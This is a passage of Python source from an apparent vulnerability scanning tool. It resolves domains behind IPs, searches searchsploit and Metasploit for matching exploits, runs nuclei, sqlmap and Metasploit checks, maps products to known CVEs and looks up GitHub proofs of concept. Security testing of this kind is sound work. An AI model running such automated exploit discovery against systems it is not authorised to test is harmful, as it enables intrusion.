                        "method": "sqlmap", "timestamp": datetime.now().isoformat()}
            if not_vuln:
                return {"target": url, "vulnerability": "SQL Injection", "type": "generic",
                        "status": "not_vulnerable", "details": "sqlmap: parameters do not appear injectable",
                        "method": "sqlmap", "timestamp": datetime.now().isoformat()}
            return {"target": url, "vulnerability": "SQL Injection", "type": "generic",
                    "status": "unknown", "details": "sqlmap: no clear result",
                    "method": "sqlmap", "timestamp": datetime.now().isoformat()}
        except subprocess.TimeoutExpired:
            return {"target": url, "vulnerability": "SQL Injection", "type": "generic",
                    "status": "error", "details": f"sqlmap timeout ({timeout}s)",
                    "method": "sqlmap", "timestamp": datetime.now().isoformat()}
        except Exception as e:
            return {"target": url, "vulnerability": "SQL Injection", "type": "generic",
                    "status": "error", "details": str(e), "method": "sqlmap",
                    "timestamp": datetime.now().isoformat()}


# ═══════════════════════════════════════════════════════════════════════════════
# DOMAIN RESOLVER
# ═══════════════════════════════════════════════════════════════════════════════
class DomainResolver:
    def __init__(self, token_2ip=None):
        self.token_2ip = token_2ip
        self.session = requests.Session()
        self.session.verify = False
        self.session.headers.update({
            "User-Agent": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
            "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
            "Accept-Language": "ru-RU,ru;q=0.9,en-US;q=0.8,en;q=0.7",
        })

    def resolve(self, ip):
        log_info(f"[Resolver] Resolving domains for {ip}...")
        domains = self._from_2ip_html(ip)
        if domains:
            log_success(f"[2ip.io] Found {len(domains)} domains for {ip}: {domains[0]}")
            return domains
        if self.token_2ip:
            domains = self._from_2ip_api(ip)
            if domains:
                log_success(f"[2ip API] Found {len(domains)} domains for {ip}: {domains[0]}")
                return domains
        domains = self._from_hackertarget(ip)
        if domains:
            log_success(f"[Hackertarget] Found {len(domains)} domains for {ip}: {domains[0]}")
            return domains
        rdns = resolve_domain(ip)
        if rdns and not is_ip(rdns):
            log_success(f"[Reverse DNS] {ip} -> {rdns}")
            return [rdns]
        log_warning(f"[Resolver] No domains found for {ip}, will scan IP directly")
        return []

    def _from_2ip_html(self, ip):
        try:
            url = f"https://2ip.io/ru/lookup/{ip}"
            r = self.session.get(url, timeout=20)
            if r.status_code != 200:
                return []
            text = r.text
            domains = set()
            for m in re.finditer(r"href=[\'\"]https?://([^\'\"\/\s]+)", text):
                d = m.group(1).lower().strip()
                if self._valid(d):
                    domains.add(d)
            for m in re.finditer(r"\b([a-z0-9]([a-z0-9\-]{0,61}[a-z0-9])?\.)+[a-z]{2,}\b", text, re.IGNORECASE):
                d = m.group(0).lower().strip()
                if self._valid(d):
                    domains.add(d)
            filtered = [d for d in domains if not any(d.endswith(ext) for ext in [".png", ".jpg", ".jpeg", ".gif", ".css", ".js", ".ico", ".svg", ".woff", ".woff2"])]
            return filtered[:20]
        except Exception as e:
            log_warning(f"[2ip.io HTML] {ip}: {e}")
            return []

    def _from_2ip_api(self, ip):
        try:
            url = f"https://api.2ip.io/domains/{ip}?token={self.token_2ip}"
            r = self.session.get(url, timeout=15)
            if r.status_code != 200:
                return []
            data = r.json()
            return data.get("domains", [])[:20]
        except Exception as e:
            log_warning(f"[2ip.io API] {ip}: {e}")
            return []

    def _from_hackertarget(self, ip):
        try:
            url = f"https://api.hackertarget.com/reverseiplookup/?q={ip}"
            r = self.session.get(url, timeout=15)
            if r.status_code != 200:
                return []
            text = r.text.strip()
            if "error" in text.lower() or "no dns" in text.lower() or "api count" in text.lower():
                return []
            domains = [d.strip() for d in text.split("\n") if d.strip() and "." in d and not d.startswith("http")]
            return domains[:20]
        except Exception as e:
            log_warning(f"[Hackertarget] {ip}: {e}")
            return []

    def _valid(self, d):
        if not d or len(d) > 253 or d.count(".") < 1:
            return False
        blocked = {
            "2ip.io", "www.2ip.io", "ajax.googleapis.com", "fonts.googleapis.com",
            "fonts.gstatic.com", "cdnjs.cloudflare.com", "code.jquery.com",
            "googletagmanager.com", "google-analytics.com", "yandex.ru",
            "mc.yandex.ru", "vk.com", "facebook.com", "twitter.com", "x.com"
        }
        if d in blocked or d.startswith("."):
            return False
        return True

# ═══════════════════════════════════════════════════════════════════════════════
# SEARCHSPLOIT — УЛУЧШЕН (фильтрация по году/версии, dedup)
# ═══════════════════════════════════════════════════════════════════════════════
class ExploitFinder:
    def __init__(self):
        self._cache = {}
        self._seen_global = set()

    def _extract_cves(self, codes_str):
        if not codes_str:
            return []
        return re.findall(r"CVE-\d{4}-\d+", str(codes_str), re.IGNORECASE)

    def _is_metasploit(self, path, title):
        path_lower = str(path).lower()
        title_lower = str(title).lower()
        return (
            "metasploit" in path_lower or "metasploit" in title_lower or
            "msf" in path_lower or "msf" in title_lower or path_lower.endswith(".rb")
        )

    def _filter_by_version(self, results, service_version):
        if not service_version:
            return results
        filtered = []
        ver_clean = re.sub(r"[^0-9.]", "", str(service_version))
        for exp in results:
            title = str(exp.get("Title", ""))
            ver_in_title = re.search(r"\b(\d+\.\d+(?:\.\d+)?)\b", title)
            if ver_in_title:
                title_ver = ver_in_title.group(1)
                if ver_clean.startswith(title_ver) or title_ver.startswith(ver_clean.split(".")[0]):
                    exp["version_match"] = True
                    filtered.append(exp)
                else:
                    exp["version_match"] = False
                    filtered.append(exp)
            else:
                exp["version_match"] = None
                filtered.append(exp)
        return filtered

    def _filter_by_year(self, results, min_year=2010):
        if not results:
            return results
        modern = []
        ancient = []
        for exp in results:
            cves = self._extract_cves(exp.get("Codes", ""))
            is_modern = False
            for cve in cves:
                m = re.search(r"CVE-(\d{4})-", cve)
                if m and int(m.group(1)) >= min_year:
                    is_modern = True
                    break
            if is_modern:
                modern.append(exp)
            else:
                ancient.append(exp)
        if modern:
            return modern + ancient[:3]
        return ancient

    def search(self, product, version, raw_banner=None):
        if not is_tool_installed("searchsploit"):
            return None
        if not product:
            return None

        cache_key = f"{product}:{version}"
        if cache_key in self._cache:
            return self._cache[cache_key]

        queries = []
        if product and version:
            queries.append(f"{product} {version}".strip())
        elif product:
            queries.append(product)

        generic = {"http", "https", "smtp", "pop3", "imap", "imaps", "pop3s", "ftp", "ftps", "telnet"}
        is_generic = product.lower() in generic
        if is_generic and not version and raw_banner:
            keywords = re.findall(r"([A-Z][a-zA-Z0-9_-]{2,})", raw_banner)
            for kw in keywords[:3]:
                if kw.lower() not in generic and len(kw) > 3:
                    queries.append(kw)

        all_results = []
        seen_ids = set()

        for query in queries:
            if not query or query in seen_ids:
                continue
            seen_ids.add(query)
            log_info(f"[Searchsploit] Searching: {query}")

            if query in self._cache:
                cached = self._cache[query]
                for exp in cached:
                    eid = exp.get("EDB-ID", "") or exp.get("Title", "")
                    if eid not in self._seen_global:
                        self._seen_global.add(eid)
                        all_results.append(exp)
                continue

            cmd = ["searchsploit", "--json", "--exclude=", query]
            try:
                r = subprocess.run(cmd, capture_output=True, text=True, timeout=60)
                if r.returncode != 0 or not r.stdout.strip():
                    continue
                data = json.loads(r.stdout)
                raw_results = data.get("RESULTS_EXPLOIT", []) + data.get("RESULTS_SHELLCODE", [])
                query_results = []
                for exp in raw_results:
                    exp_id = exp.get("EDB-ID", "") or exp.get("Title", "")
                    if exp_id not in self._seen_global:
                        self._seen_global.add(exp_id)
                        enriched = dict(exp)
                        enriched["cves"] = self._extract_cves(exp.get("Codes", ""))
                        enriched["is_metasploit"] = self._is_metasploit(exp.get("Path", ""), exp.get("Title", ""))
                        enriched["matched_by"] = query
                        query_results.append(enriched)
                self._cache[query] = query_results
                all_results.extend(query_results)
            except Exception as e:
                log_error(f"[Searchsploit] err for '{query}': {e}")

        all_results = self._filter_by_version(all_results, version)
        all_results = self._filter_by_year(all_results, min_year=2010)

        self._cache[cache_key] = all_results
        if all_results:
            log_success(f"[Searchsploit] Found {len(all_results)} unique exploits")
        elif is_generic and not version:
            log_info(f"[Searchsploit] No specific exploits for generic '{product}'")
        else:
            log_info(f"[Searchsploit] No exploits found")
        return all_results if all_results else None

    def scan_services(self, detailed_ports):
        all_exploits = {}
        for p in detailed_ports:
            svc = p.get("service", {})
            product = svc.get("product", "") or svc.get("name", "")
            version = svc.get("version", "")
            raw_banner = svc.get("banner", "")
            if product:
                key = f"{product} {version}".strip() if version else product
                if key not in all_exploits:
                    res = self.search(product, version, raw_banner=raw_banner)
                    if res:
                        all_exploits[key] = {
                            "port": p["port"],
                            "service": svc.get("name", ""),
                            "product": product,
                            "version": version,
                            "exploits": res[:10]
                        }
        return all_exploits


# ═══════════════════════════════════════════════════════════════════════════════
# METASPLOIT
# ═══════════════════════════════════════════════════════════════════════════════
class MetasploitFinder:
    def __init__(self):
        self.msfconsole = shutil.which("msfconsole")
        self._cache = {}
        self._available = self.msfconsole is not None

    def is_available(self):
        return self._available

    def search(self, product, version):
        if not self._available or not product:
            return None
        queries = []
        if product and version:
            queries.append(f"{product} {version}")
        queries.append(product)
        generic = {"ssh", "http", "https", "smtp", "pop3", "imap", "imaps", "pop3s", "ftp", "ftps", "telnet"}
        if product.lower() in generic and version:
            ver_parts = version.split()
            if ver_parts:
                queries.append(ver_parts[0])

        all_modules = []
        seen_paths = set()
        for query in queries:
            if query in self._cache:
                cached = self._cache[query]
                for m in cached:
                    if m["path"] not in seen_paths:
                        seen_paths.add(m["path"])
                        all_modules.append(m)
                continue
            mods = self._search_single(query)
            self._cache[query] = mods
            for m in mods:
                if m["path"] not in seen_paths:
                    seen_paths.add(m["path"])
                    all_modules.append(m)
            if len(all_modules) >= 10:
                break
        return all_modules

    def _search_single(self, query):
        log_info(f"[Metasploit] Searching: {query}")
        try:
            cmd = ["msfconsole", "-q", "-n", "-x", f"search {query}; exit"]
            r = subprocess.run(
                cmd,
                capture_output=True,
                text=True,
                timeout=60,
                env={**os.environ, "TERM": "dumb"}
            )
            output = strip_ansi(r.stdout) + "\n" + strip_ansi(r.stderr)
            return self._parse_output(output)
        except subprocess.TimeoutExpired:
            log_error(f"[Metasploit] Timeout for '{query}'")
            return []
        except Exception as e:
            log_error(f"[Metasploit] Error: {e}")
            return []

    def _parse_output(self, text):
        modules = []
        in_table = False
        for line in text.split("\n"):
            line = line.rstrip()
            if not line:
                continue
            if "Matching Modules" in line:
                in_table = True
                continue
            if not in_table:
                continue
            if line.strip().startswith("=") or line.strip().startswith("-"):
                continue
            if "Name" in line and "Disclosure Date" in line:
                continue
            m = re.match(r"^\s*\d+\s+(\S+)(?:\s+(.*))?$", line)
            if not m:
                continue
            path = m.group(1)
            if "/" not in path:
                continue
            rest = m.group(2) or ""
            parts = rest.split()
            date = ""
            rank = ""
            check = ""
            desc = ""
            if parts and re.match(r"\d{4}-\d{2}-\d{2}", parts[0]):
                date = parts[0]
                parts = parts[1:]
            if parts:
                rank = parts[0]
                parts = parts[1:]
            if parts and parts[0] in ("Yes", "No"):
                check = parts[0]
                parts = parts[1:]
            desc = " ".join(parts)
            modules.append({"path": path, "date": date, "rank": rank, "check": check, "description": desc})
        return modules

    def scan_services(self, detailed_ports):
        all_modules = {}
        seen_keys = set()
        for p in detailed_ports:
            svc = p.get("service", {})
            product = svc.get("product", "") or svc.get("name", "")
            version = svc.get("version", "")
            if product:
                key = f"{product} {version}".strip() if version else product
                if key in seen_keys:
                    continue
                seen_keys.add(key)
                modules = self.search(product, version)
                if modules:
                    log_success(f"[Metasploit] Found {len(modules)} unique modules for {key}")
                    all_modules[key] = {
                        "port": p["port"],
                        "service": svc.get("name", ""),
                        "product": product,
                        "version": version,
                        "modules": modules
                    }
        return all_modules


# ═══════════════════════════════════════════════════════════════════════════════
# NUCLEI
# ═══════════════════════════════════════════════════════════════════════════════
class NucleiScanner:
    def scan_urls(self, urls, output_dir, threads=25):
        if not is_tool_installed("nuclei"):
            log_warning("[Nuclei] not installed — skipping")
            return None
        if not urls:
            return None
        log_info(f"[Nuclei] Scanning {len(urls)} URLs")
        url_file = f"/tmp/nuclei_urls_{int(time.time())}.txt"
        with open(url_file, "w") as f:
            for u in urls:
                f.write(u + "\n")
        out_json = f"{output_dir}/nuclei_results.json"
        cmd = [
            "nuclei", "-l", url_file,
            "-t", "cves/", "-t", "vulnerabilities/",
            "-json", "-o", out_json,
            "-c", str(threads),
            "-silent", "-stats"
        ]
        try:
            subprocess.run(cmd, capture_output=True, text=True, timeout=1800)
            results = []
            if os.path.exists(out_json):
                with open(out_json) as f:
                    for line in f:
                        if line.strip():
                            try:
                                results.append(json.loads(line))
                            except:
                                pass
            log_success(f"[Nuclei] Scanned {len(urls)} URLs, findings: {len(results)}")
            return results
        except Exception as e:
            log_error(f"[Nuclei] err: {e}")
            return []
        finally:
            if os.path.exists(url_file):
                os.remove(url_file)

    def check_cve(self, url, cve, timeout=120):
        """Точечная проверка одного CVE nuclei-шаблоном (fallback, когда
        нет встроенного check и метаплоты). Требует установленный nuclei."""
        if not is_tool_installed("nuclei"):
            return None
        cve_upper = str(cve).upper()
        if not re.match(r"^CVE-\d{4}-\d+$", cve_upper):
            return None
        try:
            r = subprocess.run(
                ["nuclei", "-u", url, "-tags", "cve", "-id", cve_upper,
                 "-json", "-silent", "-no-color"],
                capture_output=True, text=True, timeout=timeout)
            findings = []
            for line in (r.stdout or "").splitlines():
                line = line.strip()
                if not line:
                    continue
                try:
                    findings.append(json.loads(line))
                except Exception:
                    pass
            if findings:
                return {
                    "target": url, "vulnerability": cve_upper, "type": "cve",
                    "status": "vulnerable",
                    "details": f"nuclei template matched ({len(findings)} finding(s))",
                    "method": "nuclei_cve_check",
                    "timestamp": datetime.now().isoformat(),
                    "raw_output": json.dumps(findings[:3])[:500]
                }
            # Шаблон существует и не сработал: exit 0 без вывода
            if r.returncode == 0:
                return {
                    "target": url, "vulnerability": cve_upper, "type": "cve",
                    "status": "not_vulnerable",
                    "details": "nuclei template ran, no match",
                    "method": "nuclei_cve_check",
                    "timestamp": datetime.now().isoformat()
                }
            return None  # шаблона нет или ошибка — не считаем результатом
        except Exception:
            return None


class PoCVerifier:
    """Smart PoC Verifier v3.0 with Confidence Engine"""

    def __init__(self, vulners_engine=None, epss_kev_client=None, github_finder=None):
        self.session = requests.Session()
        self.session.verify = False
        self.session.headers.update({
            "User-Agent": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36",
            "Accept": "*/*", "Accept-Language": "en-US,en;q=0.9",
        })
        self.timeout = 15
        self._msf_available = shutil.which("msfconsole") is not None
        self._msf_cache = {}
        self.vulners = vulners_engine or VulnersEngine()
        self.epss_kev = epss_kev_client or EPSSKEVClient()
        self.github = github_finder or GitHubPoCFinder()
        self.confidence = ConfidenceEngine(self.vulners, self.epss_kev)
        self._nuclei = NucleiScanner()
        self.aggressive = False
        self.waf_signatures = {
            "cloudflare": ["cloudflare", "cf-ray", "cf-cache-status"],
            "modsecurity": ["mod_security", "modsecurity", "406 not acceptable"],
            "akamai": ["akamai"], "incapsula": ["incapsula"],
            "sucuri": ["sucuri"], "aws_waf": ["awselb", "awsalb"],
        }

    def verify_all(self, scan_data):
        # Предзагрузка EPSS одним bulk-запросом вместо запроса на каждый CVE
        all_cves = set()
        main = scan_data.get("main", {})
        for item in main.get("cpe_cves", []) or []:
            if isinstance(item, dict) and item.get("cve"):
                all_cves.add(item["cve"])
        for finding in scan_data.get("nuclei_findings", []) or []:
            if isinstance(finding, dict):
                cve = finding.get("cve") or finding.get("template-id") or finding.get("templateID")
                if cve and "CVE-" in str(cve).upper():
                    all_cves.add(str(cve))
        for sub_data in list(scan_data.get("subdomains", {}).values()) + \
                       list(scan_data.get("hard_mode_subdomains", {}).values()):
            if isinstance(sub_data, dict):
                for item in sub_data.get("cpe_cves", []) or []:
                    if isinstance(item, dict) and item.get("cve"):
                        all_cves.add(item["cve"])
        if all_cves:
            try:
                self.epss_kev.get_epss_bulk(all_cves)
            except Exception:
                pass
        results = {
            "main": [], "subdomains": {}, "hard_mode_subdomains": {},
            "summary": {"total": 0, "vulnerable": 0, "not_vulnerable": 0,
                        "unknown": 0, "error": 0, "blocked": 0, "skipped": 0}
        }
        main = scan_data.get("main", {})
        if main and isinstance(main, dict):
            target = main.get("domain") or main.get("target")
            ip = main.get("ip")
            ports = main.get("detailed", [])
            nuclei = scan_data.get("nuclei_findings", [])
            exploits = main.get("exploits", {})
            msf = main.get("metasploit", {})
            cpe_cves = main.get("cpe_cves", [])
            results["main"] = self._verify_target(target, ip, ports, nuclei, exploits, msf, cpe_cves, "main")
        for sub, data in scan_data.get("subdomains", {}).items():
            if isinstance(data, dict) and "error" not in data:
                target = data.get("domain") or data.get("target")
                ip = data.get("ip")
                ports = data.get("detailed", [])
                exploits = data.get("exploits", {})
                msf = data.get("metasploit", {})
                cpe_cves = data.get("cpe_cves", [])
                results["subdomains"][sub] = self._verify_target(target, ip, ports, [], exploits, msf, cpe_cves, sub)
        for sub, data in scan_data.get("hard_mode_subdomains", {}).items():
            if isinstance(data, dict) and "error" not in data:
                target = data.get("domain") or data.get("target")
                ip = data.get("ip")
                ports = data.get("detailed", [])
                exploits = data.get("exploits", {})
                msf = data.get("metasploit", {})
                cpe_cves = data.get("cpe_cves", [])
                results["hard_mode_subdomains"][sub] = self._verify_target(target, ip, ports, [], exploits, msf, cpe_cves, sub)
        all_checks = list(results["main"])
        for sub_checks in results["subdomains"].values(): all_checks.extend(sub_checks)
        for sub_checks in results["hard_mode_subdomains"].values(): all_checks.extend(sub_checks)
        results["summary"]["total"] = len(all_checks)
        all_checks = [c for c in all_checks if isinstance(c, dict)]
        for c in all_checks:
            s = c.get("status", "unknown")
            if s in results["summary"]: results["summary"][s] += 1
        log_success(f"[PoC] Done: {results['summary']['vulnerable']}V/{results['summary']['not_vulnerable']}NV/"
                   f"{results['summary']['unknown']}U/{results['summary']['error']}E/"
                   f"{results['summary']['blocked']}B/{results['summary']['skipped']}S (total {results['summary']['total']})")
        return results

    def _detect_waf(self, response):
        if not response: return None
        if response.status_code in [403, 406, 419, 503]:
            headers_text = " ".join([f"{k}:{v}" for k, v in response.headers.items()]).lower()
            body_text = response.text[:500].lower()
            combined = headers_text + " " + body_text
            for waf_name, sigs in self.waf_signatures.items():
                for sig in sigs:
                    if sig in combined: return waf_name
        return None

    def _verify_target(self, target, ip, ports, nuclei_findings, exploits, msf_data, cpe_cves, label):
        checks = []
        if not target and not ip: return checks
        base_urls = self._build_base_urls(target, ip, ports)
        seen_checks = set()
        seen_generics = set()

        # CPE-based CVEs from Vulners
        cpe_items = []
        for cve_item in cpe_cves:
            cve = cve_item.get("cve", "")
            port = cve_item.get("port")
            cpe = cve_item.get("cpe", "")
            if cve: cpe_items.append({"cve": cve, "port": port, "cpe": cpe, "source": "vulners_cpe"})
        def _priority(item):
            _, _, combined = self.epss_kev.get_priority_score(item["cve"])
            return -combined
        cpe_items.sort(key=_priority)
        for item in cpe_items:
            cve = item["cve"]
            port = item["port"]
            host = target or ip
            service_info = self._get_service_info(ports, port)
            conf = self.confidence.score(service_info, cve, "vulners")
            conf = self._maybe_escalate(conf)
            if conf["action"] == "skip":
                checks.append({"target": target or ip, "vulnerability": cve, "type": "vulners_cpe",
                    "status": "skipped", "details": f"Confidence {conf['score']}/100 -- {conf['reason']}",
                    "method": "confidence_skip", "timestamp": datetime.now().isoformat(), "label": label,
                    "confidence": conf["score"], "epss": conf["epss"], "kev": conf["kev"]})
                continue
            for url in base_urls:
                key = (host, cve)
                if key in seen_checks: continue
                seen_checks.add(key)
                res = self._run_all_checks_for_cve(url, cve, {"port": port, "confidence": conf}, label)
                if res:
                    for r in res:
                        r["confidence"] = conf["score"]; r["epss"] = conf["epss"]; r["kev"] = conf["kev"]; r["label"] = label
                        checks.append(r)

        # Nuclei findings
        for finding in nuclei_findings:
            cve = self._extract_cve_from_string(finding.get("template-id", ""))
            if cve:
                host = finding.get("host", "") or (target or ip)
                for url in [f"http://{host}", f"https://{host}"]:
                    key = (host, cve)
                    if key in seen_checks: continue
                    seen_checks.add(key)
                    service_info = self._get_service_info(ports, None)
                    conf = self.confidence.score(service_info, cve, "generic")
                    if conf["action"] == "skip":
                        checks.append({"target": host, "vulnerability": cve, "type": "nuclei",
                            "status": "skipped", "details": f"Confidence {conf['score']}/100 -- {conf['reason']}",
                            "method": "confidence_skip", "timestamp": datetime.now().isoformat(), "label": label,
                            "confidence": conf["score"], "epss": conf["epss"], "kev": conf["kev"]})
                        continue
                    res = self._run_all_checks_for_cve(url, cve, finding, label)
                    if res:
                        for r in res:
                            r["confidence"] = conf["score"]; r["epss"] = conf["epss"]; r["kev"] = conf["kev"]; r["label"] = label
                            checks.append(r)

        # Searchsploit
        for key, edata in exploits.items():
            for exp in edata.get("exploits", []):
                for cve in exp.get("cves", []):
                    cve_upper = cve.upper()
                    host = target or ip
                    service_info = {"product": edata.get("product", ""), "version": edata.get("version", ""), "banner": ""}
                    conf = self.confidence.score(service_info, cve_upper, "searchsploit")
                    if conf["action"] == "skip":
                        checks.append({"target": host, "vulnerability": cve_upper, "type": "searchsploit",
                            "status": "skipped", "details": f"Confidence {conf['score']}/100 -- {conf['reason']}",
                            "method": "confidence_skip", "timestamp": datetime.now().isoformat(), "label": label,
                            "confidence": conf["score"], "epss": conf["epss"], "kev": conf["kev"]})
                        continue
                    for url in base_urls:
                        key = (host, cve_upper)
                        if key in seen_checks: continue
                        seen_checks.add(key)
                        res = self._run_all_checks_for_cve(url, cve_upper, {"port": edata.get("port"), "confidence": conf}, label)
                        if res:
                            for r in res:
                                r["confidence"] = conf["score"]; r["epss"] = conf["epss"]; r["kev"] = conf["kev"]; r["label"] = label
                                checks.append(r)

        # Metasploit
        if msf_data:
            for key, mdata in msf_data.items():
                for mod in mdata.get("modules", []):
                    mod_cves = self._extract_cves_from_msf_module(mod)
                    port = mdata.get("port")
                    host = target or ip
                    service_info = {"product": mdata.get("product", ""), "version": mdata.get("version", ""), "banner": ""}
                    for cve in mod_cves:
                        conf = self.confidence.score(service_info, cve, "metasploit")
                        if conf["action"] == "skip":
                            checks.append({"target": host, "vulnerability": cve, "type": "metasploit",
                                "status": "skipped", "details": f"Confidence {conf['score']}/100 -- {conf['reason']}",
                                "method": "confidence_skip", "timestamp": datetime.now().isoformat(), "label": label,
                                "confidence": conf["score"], "epss": conf["epss"], "kev": conf["kev"]})
                            continue
                        for url in base_urls:
                            key = (host, cve)
                            if key in seen_checks: continue
                            seen_checks.add(key)
                            res = self._run_all_checks_for_cve(url, cve, {"port": port, "confidence": conf}, label)
                            if res:
                                for r in res:
                                    r["confidence"] = conf["score"]; r["epss"] = conf["epss"]; r["kev"] = conf["kev"]; r["label"] = label
                                    checks.append(r)
                    if mod.get("check") == "Yes":
                        mod_path = mod["path"]
                        conf = self.confidence.score(service_info, "", "metasploit")
                        if conf["score"] < 70:
                            checks.append({"target": host, "vulnerability": mod_path, "type": "metasploit",
                                "status": "skipped", "details": f"Confidence {conf['score']}/100 < 70, skipping MSF check",
                                "method": "confidence_skip", "timestamp": datetime.now().isoformat(), "label": label,
                                "confidence": conf["score"]})
                            continue
                        if (host, mod_path) not in seen_checks:
                            seen_checks.add((host, mod_path))
                            res = self._run_metasploit_check(target, ip, port, mod, label)
                            if res:
                                res["confidence"] = conf["score"]
                                checks.append(res)

        # Service-specific web checks
        for p in ports:
            svc = p.get("service", {})
            port_num = int(p["port"]) if str(p["port"]).isdigit() else 0
            product = (svc.get("product", "") or svc.get("name", "")).lower()
            version = svc.get("version", "")
            host = target if target else ip
            product_cves = []
            if "apache" in product or "httpd" in product:
                if "2.4.49" in version: product_cves.append("CVE-2021-41773")
                if "2.4.50" in version: product_cves.append("CVE-2021-42013")
            if "log4j" in product or "java" in product: product_cves.append("CVE-2021-44228")
            if "struts" in product: product_cves.extend(["CVE-2017-5638", "CVE-2018-11776"])
            if "spring" in product: product_cves.append("CVE-2022-22965")
            if "tomcat" in product: product_cves.append("CVE-2020-1938")
            if "exchange" in product or ("microsoft" in product and "imap" in product): product_cves.append("CVE-2021-26855")
            if "drupal" in product: product_cves.append("CVE-2018-7600")
            if "citrix" in product or "netscaler" in product: product_cves.append("CVE-2019-19781")
            if "f5" in product or "big-ip" in product: product_cves.append("CVE-2020-5902")
            if "jenkins" in product: product_cves.extend(["CVE-2017-1000353", "CVE-2018-1000861"])
            if "confluence" in product: product_cves.extend(["CVE-2021-26084", "CVE-2022-26134"])
            if "elastic" in product: product_cves.extend(["CVE-2014-3120", "CVE-2015-1427"])
            if "redis" in product and port_num in (6379, 0): product_cves.append("CVE-2022-0543")
            if "weblogic" in product: product_cves.append("CVE-2017-10271")
            if "nexus" in product: product_cves.append("CVE-2019-7238")
            if "gitlab" in product: product_cves.append("CVE-2021-22205")
            if "grafana" in product: product_cves.append("CVE-2021-43798")
            service_info = {"product": svc.get("product", ""), "version": version, "banner": ""}
            for cve in product_cves:
                conf = self.confidence.score(service_info, cve, "generic")
                conf = self._maybe_escalate(conf)
                if conf["action"] == "skip":
                    checks.append({"target": host, "vulnerability": cve, "type": "product_mapping",
                        "status": "skipped", "details": f"Confidence {conf['score']}/100 -- {conf['reason']}",
                        "method": "confidence_skip", "timestamp": datetime.now().isoformat(), "label": label,
                        "confidence": conf["score"], "epss": conf["epss"], "kev": conf["kev"]})
                    continue
                for url in base_urls:
                    key = (host, cve)
                    if key in seen_checks: continue
                    seen_checks.add(key)
                    res = self._run_all_checks_for_cve(url, cve, {"port": port_num, "confidence": conf}, label)
                    if res:
                        for r in res:
                            r["confidence"] = conf["score"]; r["epss"] = conf["epss"]; r["kev"] = conf["kev"]; r["label"] = label
                            checks.append(r)
            name = svc.get("name", "").lower()
            if name in ("http", "https") or port_num in (80, 443, 8080, 8443, 8000, 9000):
                scheme = "https" if name == "https" or port_num in (443, 8443) else "http"
                if not host: continue
                url = f"{scheme}://{host}" if port_num in (80, 443) else f"{scheme}://{host}:{port_num}"
                for check_name, check_method in [("SQLi", self.check_sqli), ("XSS", self.check_xss), ("LFI", self.check_lfi), ("RCE", self.check_rce)]:
                    if check_name not in seen_generics:
                        try:
                            result = check_method(url)
                            if result:
                                result["target"] = target or ip; result["port"] = port_num; result["label"] = label; result["confidence"] = 30
                                checks.append(result)
                            seen_generics.add(check_name)
                        except Exception: pass
            # TLS-порты почты и прочего: Heartbleed проверяется по каждому
            # TLS-порту, а не только на 443
            if port_num in (465, 993, 995, 9443) and port_num not in seen_generics:
                seen_generics.add(port_num)
                hb_host = target if target else ip
                scheme2 = "https"
                hb_url = f"{scheme2}://{hb_host}:{port_num}"
                res = self.check_heartbleed(hb_url, {"port": port_num})
                if res:
                    res["label"] = label; res["confidence"] = 55
                    checks.append(res)
        return checks

    def _maybe_escalate(self, conf):
        """--aggressive: всё с confidence >= 40 уходит на безопасную проверку
        (msf check / nuclei), даже без EPSS/KEV-эскалации."""
        if self.aggressive and conf.get("score", 0) >= 40 and conf.get("action") in ("skip", "info_only"):
            conf = dict(conf)
            conf["score"] = max(conf["score"], 55)
            conf["action"] = "run_check"
            conf["level"] = "MEDIUM"
            conf["reason"] += " | --aggressive: escalated to safe check"
        return conf

    def _get_service_info(self, ports, port_num):
        if not port_num: return {"product": "", "version": "", "banner": "", "cpe": ""}
        for p in ports:
            if str(p.get("port")) == str(port_num):
                svc = p.get("service", {})
                return {"product": svc.get("product", "") or svc.get("name", ""), "version": svc.get("version", ""),
                        "banner": svc.get("banner", ""), "cpe": ", ".join(svc.get("cpes", []))}
        return {"product": "", "version": "", "banner": "", "cpe": ""}

    def _build_base_urls(self, target, ip, ports):
        urls = []; hosts = []
        if target: hosts.append(target)
        if ip and ip != target: hosts.append(ip)
        for h in hosts:
            urls.append(f"http://{h}"); urls.append(f"https://{h}")
        for p in ports:
            port_num = int(p["port"]) if str(p.get("port", "")).isdigit() else 0
            if port_num in (80, 8080, 8000, 9000):
                for h in hosts: urls.append(f"http://{h}:{port_num}")
            if port_num in (443, 8443, 9443):
                for h in hosts: urls.append(f"https://{h}:{port_num}")
        return list(dict.fromkeys([u for u in urls if u]))

    def _run_all_checks_for_cve(self, url, cve, context, label):
        results = []
        port = context.get("port") if context else None
        host = url.replace("http://", "").replace("https://", "").split("/")[0].split(":")[0]
        conf = context.get("confidence", {}) if isinstance(context, dict) else {}
        # 55 = run_check (после эскалации EPSS/KEV) — msf search кэшируется по CVE
        if self._msf_available and conf.get("score", 0) >= 55:
            msf_modules = self._search_metasploit_by_cve(cve)
            if msf_modules:
                checked = [m for m in msf_modules if m.get("check") == "Yes"]
                if checked:
                    log_info(f"[PoC] MSF {cve}: {len(checked)} module(s) with safe check")
                for mod in msf_modules:
                    if mod.get("check") == "Yes":
                        res = self._run_metasploit_check(host, host, port, mod, label)
                        if res:
                            res["cve"] = cve; results.append(res)
                            if res.get("status") == "vulnerable": return results
        web_result = self._check_cve_by_id(url, cve, context)
        if web_result:
            web_result["label"] = label; results.append(web_result)
        # Fallback: встроенного check нет (или он unknown) и никакого
        # определённого ответа ещё нет — пробуем nuclei-шаблон этого CVE.
        # (msf "Check failed/cannot determine" = unknown тоже считается
        # отсутствием определённого ответа.)
        definitive = any(r.get("status") in ("vulnerable", "not_vulnerable", "blocked") for r in results)
        if conf.get("score", 0) >= 40 and (not web_result or web_result.get("status") == "unknown") and not definitive:
            nuclei_res = self._nuclei.check_cve(url, cve)
            if nuclei_res:
                nuclei_res["label"] = label
                if conf:
                    nuclei_res["confidence"] = conf.get("score")
                results.append(nuclei_res)
                log_info(f"[PoC] nuclei fallback for {cve} on {url}: {nuclei_res['status']}")
        if not results or all(r.get("status") in ("unknown", "not_vulnerable") for r in results):
            github_pocs = self.github.find_poc(cve)
            if github_pocs:
                for poc in github_pocs:
                    results.append({"target": url, "vulnerability": cve, "type": "github_poc",
                        "status": "info", "details": f"GitHub PoC found: {poc['url']} ({poc['stars']} stars)",
